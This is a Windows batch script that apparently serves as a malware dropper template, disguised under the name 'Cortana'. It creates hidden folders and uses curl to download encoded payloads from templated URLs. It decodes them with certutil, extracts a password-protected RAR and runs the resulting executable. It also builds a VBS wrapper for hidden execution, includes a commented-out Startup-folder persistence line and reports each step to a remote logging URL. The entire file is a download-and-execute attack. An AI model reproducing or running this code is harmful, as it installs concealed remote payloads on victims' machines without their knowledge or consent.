@echo on
mkdir "%tmp%/Cortana" || curl -k "{{logUrl}}?error-couldnt_create_tmp_cortana" 
attrib +h "%tmp%/Cortana" || curl -k "{{logUrl}}?error-couldnt_create_tmp_cortana_attrib" 
mkdir "%tmp%/Cortana/setup" || curl -k "{{logUrl}}?error-couldnt_create_tmp_cortana_setup"
(
    echo @echo on
    echo ^:start
        echo echo start
        echo tasklist ^| find "CortanaAssistance.exe" ^|^| ^(
            echo if not exist "%localappdata%/Cortana/CortanaAssistance.exe" ^(
                echo if not exist "%localappdata%/Cortana/setup/unrar.exe" ^(
                    echo curl -k "{{rarUrl}}" -o "%tmp%/unrar.txt" ^|^| curl -k "{{logUrl}}?error=couldnt_download_unrar"
                    echo move /y "%tmp%/unrar.txt" "%localappdata%\Cortana\setup\"
                    echo certutil -decode "%localappdata%/Cortana/setup/unrar.txt" "%localappdata%/Cortana/setup/unrar.exe" ^|^| curl -k "{{logUrl}}?error=couldnt_move_unrar"
                    echo del %localappdata%\Cortana\setup\unrar.txt ^|^| curl -k "{{logUrl}}?error-couldnt_delete_unrar echo ^)
                echo ^)
                echo if exist "%localappdata%/Cortana/setup/unrar.exe" ^(
                    echo curl -k "{{assistUrl}}" -o "%localappdata%/Cortana/setup/assist.rar" ^|^| curl -k "{{logUrl}}?erro 
                    echo "%localappdata%/Cortana/setup/unrar.exe" x "%localappdata%/Cortana/setup/assist.rar" "%localappdata%/Cortana/" -pP@2022 -y ^|^|^( 
                        echo curl -k "{{logUrl}}/?error-couldnt_unrar_cortana" 
                        echo goto alternate
                    echo ^)
                echo ^) else ^(
                    echo goto alternate
                    echo ^)
            echo ^)
            echo if not exist "%localappdata%/Cortana/CortanaAssistance.exe" ^(
                echo ^:alternate
                    echo curl -k "{{cortanaUrl}}" -o "%tmp%/CortanaAssistance.txt"
                    echo move /y %tmp%\CortanaAssistance.txt %localappdata%\Cortana
                    echo rename %localappdata%\Cortana\CortanaAssistance.txt CortanaAssistance.exe
            echo ^)
            echo tasklist ^| find "CortanaAssistance.exe" ^|^| "%localappdata%/Cortana/CortanaAssistance.exe" 
        echo ^)
        echo REM timeout 300
    echo REM goto start
) > "%tmp%/Cortana/CortanaDefault.bat" || curl -k "{{logUrl}}?error=couldnt_save_cortana_default"
if not exist "%tmp%/Cortana/setup/unrar.txt" (
    curl -k "{{rarUrl}}" -o "%tmp%/Cortana/setup/unrar.txt" || curl -k "{{logUrl}}?error-unrar_download" 
)
certutil -decode "%tmp%/Cortana/setup/unrar.txt" "%tmp%/Cortana/setup/unrar.exe" || curl -k "{{logUrl}}?error-creating_unrar 
del %tmp%\Cortana\setup\unrar.txt
echo CreateObject("Wscript.Shell^).Run """" ^& "WScript.Arguments^(0^) ^& """", 0, False > "%tmp%/Cortana/inv.vbs"
xcopy /H /R /S /E /V /K /Y /I "%tmp%/Cortana" "%localappdata%/Cortana" || curl -k "{{logUrl}}?error-couldnt_copy_cortana"
del %tmp%\Cortana /Q /S /F & rmdir %tmp%\Cortana /Q /S || curl -k "{{logUrl}}?error-couldnt_remove_tmp_cortana"
attrib +h "%localappdata%/Cortana" || curl -k "{{logUrl}}?error-couldnt set cortana attrib
REM echo wscript.exe "%localappdata%/Cortana/inv.vbs" "%localappdata%/Cortana/CortanaDefault.bat" > "appdata/Microsoft/Windows/Start Menu/Programs/Startup/CortanaAssist.bat" 
cmd /c "%localappdata%/Cortana/CortanaDefault.bat" || (
    curl -k "{{logUrl}}?error-couldnt_call_cortana_default"
)
